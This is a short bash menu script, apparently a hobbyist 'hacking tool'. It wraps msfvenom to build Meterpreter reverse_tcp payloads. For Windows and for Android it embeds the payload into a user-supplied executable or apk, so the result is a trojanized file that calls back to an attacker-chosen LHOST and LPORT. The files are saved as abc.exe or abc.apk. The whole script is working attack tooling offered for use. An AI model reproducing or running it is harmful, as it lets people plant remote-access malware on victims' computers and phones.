#!/bin/bash
# etc etc etc
# ..................


clear                                   # Clear the screen.
mkdir ~/Desktop/Hacking 
clear                                   # Clear after making dir and entering main tool
echo -e "\E[1;36m****** \e[32m WELCOME \E[1;36m******"
echo -e "\E[1;32m                                                       
 ___ ___  ____ _     ____   __ ____ ___  __ __  _____     ______ __    __ ____ ____  
|   |   |/    | |   |    | /  |    /   \|  |  |/ ___/    |      |  |__|  |    |    \ 
| _   _ |  o  | |    |  | /  / |  |     |  |  (   \_     |      |  |  |  ||  ||  _  |
|  \_/  |     | |___ |  |/  /  |  |  O  |  |  |\__  |    |_|  |_|  |  |  ||  ||  |  |
|   |   |  _  |     ||  /   \_ |  |     |  :  |/  \ |      |  | |  \  /  ||  ||  |  |
|   |   |  |  |     ||  \     ||  |     |     |\    |      |  |  \      / |  ||  |  |
|___|___|__|__|_____|____\____|____\___/ \__,_| \___|      |__|   \_/\_/ |____|__|__|
                                                                                     
                                                
 "                                    
echo -e "\e[31m   [\e[32mSELECT OPTION\e[31m]"
echo -e "\E[1;36m\E[36m[1] \e[36mPayload\e[31m [\e[32mCreating payload with msfvenom\e[31m]  "
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;36m\E[1;36m[2] \e[36mQuit" 
tput sgr0
echo -e "\E[1,36m_____________________________________________________"

read options

case "$options" in
  "1" | "1" )

  echo -e "\E[1;36m****** \e[32mCRETAING PAYLOAD\E[1;36m *****"

PS3='Enter your choice : '
options=("Windows"  "Android"  "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Give Path of apk: ' path; read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp -x $path LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/Hacking/abc.exe
            echo -e "\E[1;36m***\E[1;32m abc.exe saved to ~/Desktop/Hacking\E[1;36m***"
            ;;
	"Android")
            read -p 'Give Path of apk: ' path ;read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp -x $path LHOST=$uservar LPORT=$userport R > ~/Desktop/Hacking/abc.apk
            echo -e "\E[1;36m***\E[1;32m abc.apk saved to ~/Desktop/Hacking\E[1;36m***"
            ;;  
	 "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

 "2" | "2" )
            echo "Good Bye" 
            ;;
        *) echo invalid option;;
    esac

